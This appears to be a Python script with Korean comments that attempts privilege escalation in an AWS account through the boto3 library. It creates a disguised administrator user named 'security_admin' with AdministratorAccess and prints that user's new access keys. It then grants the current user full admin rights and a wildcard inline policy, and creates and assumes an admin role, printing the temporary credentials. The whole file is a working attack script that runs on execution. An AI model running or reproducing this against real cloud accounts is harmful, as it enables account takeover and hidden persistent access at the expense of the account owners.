import boto3
import json
from botocore.exceptions import ClientError

# AWS 자격 증명으로 세션 생성
session = boto3.Session(
    aws_access_key_id='ACCESS_KEY',
    aws_secret_access_key='SECRET_KEY'
)


def privilege_escalation():
    # IAM 클라이언트 생성
    iam = session.client('iam')

    print("=== 권한 상승 시도 시작 ===")

    try:
        # 1. 관리자 권한을 가진 새 IAM 사용자 생성
        new_admin_username = "security_admin"

        # 사용자 생성
        try:
            iam.create_user(UserName=new_admin_username)
            print(f"새 사용자 '{new_admin_username}' 생성 성공")

            # 관리자 정책 연결
            iam.attach_user_policy(
                UserName=new_admin_username,
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )
            print(f"'{new_admin_username}' 사용자에게 AdministratorAccess 정책 연결 성공")

            # 액세스 키 생성
            access_key = iam.create_access_key(UserName=new_admin_username)
            print("새 액세스 키 생성 성공:")
            print(f"Access Key ID: {access_key['AccessKey']['AccessKeyId']}")
            print(f"Secret Access Key: {access_key['AccessKey']['SecretAccessKey']}")
        except ClientError as e:
            print(f"새 사용자 생성 실패: {e}")

        # 2. 현재 사용자에게 추가 권한 부여 시도
        try:
            current_user = iam.get_user()
            username = current_user['User']['UserName']

            iam.attach_user_policy(
                UserName=username,
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )
            print(f"현재 사용자 '{username}'에게 AdministratorAccess 정책 연결 성공")
        except ClientError as e:
            print(f"현재 사용자에게 정책 연결 실패: {e}")

        # 3. 권한 상승을 위한 인라인 정책 생성 시도
        try:
            escalation_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": "*",
                        "Resource": "*"
                    }
                ]
            }

            current_user = iam.get_user()
            username = current_user['User']['UserName']

            iam.put_user_policy(
                UserName=username,
                PolicyName="FullAccessEscalation",
                PolicyDocument=json.dumps(escalation_policy)
            )
            print(f"사용자 '{username}'에게 FullAccessEscalation 인라인 정책 추가 성공")
        except ClientError as e:
            print(f"인라인 정책 추가 실패: {e}")

        # 4. 역할 수임을 통한 권한 확대 시도
        try:
            # 현재 계정 ID 확인
            sts = session.client('sts')
            account_id = sts.get_caller_identity()['Account']

            # 수임 가능한 관리자 역할 생성
            assume_role_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": f"arn:aws:iam::{account_id}:root"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }

            # 역할 생성
            response = iam.create_role(
                RoleName="AdminEscalationRole",
                AssumeRolePolicyDocument=json.dumps(assume_role_policy)
            )

            # 관리자 정책 연결
            iam.attach_role_policy(
                RoleName="AdminEscalationRole",
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )

            print("권한 상승을 위한 'AdminEscalationRole' 역할 생성 및 정책 연결 성공")

            # 역할 수임 시도
            sts = session.client('sts')
            assumed_role = sts.assume_role(
                RoleArn=f"arn:aws:iam::{account_id}:role/AdminEscalationRole",
                RoleSessionName="EscalatedSession"
            )

            print("역할 수임 성공! 높은 권한의 임시 자격 증명 획득:")
            print(f"Access Key: {assumed_role['Credentials']['AccessKeyId']}")
            print(f"Secret Key: {assumed_role['Credentials']['SecretAccessKey']}")
            print(f"Session Token: {assumed_role['Credentials']['SessionToken']}")

        except ClientError as e:
            print(f"역할 생성/수임 실패: {e}")

    except ClientError as e:
        print(f"권한 상승 시도 중 오류 발생: {e}")

    print("=== 권한 상승 시도 완료 ===")


# 실행
privilege_escalation()